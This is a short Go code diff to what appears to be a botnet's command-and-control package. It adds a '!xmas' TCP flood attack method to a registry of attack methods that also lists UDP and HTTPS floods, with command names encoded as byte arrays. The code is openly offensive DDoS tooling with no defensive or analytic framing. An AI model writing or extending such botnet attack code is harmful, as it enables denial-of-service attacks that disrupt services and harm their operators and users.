@@ -1,5 +1,7 @@
 package cnc
 
+type Attribute int
+
 type CommandsInfo struct {
 	Description string
 	Name        string
@@ -46,6 +48,12 @@ var MethodsList = map[int]MethodsInfo{
 		Uint8:       []byte{33, 111, 118, 104, 117, 100, 112},
 	},
 	5: {
+		Description: "Tcp flood with xmas packets",
+		Name:        "!xmas",
+		Layer:       4,
+		Uint8:       []byte{33, 120, 109, 97, 115},
+	},
+	6: {
 		Description: "Basic https flood",
 		Name:        "!https",
 		Layer:       7,
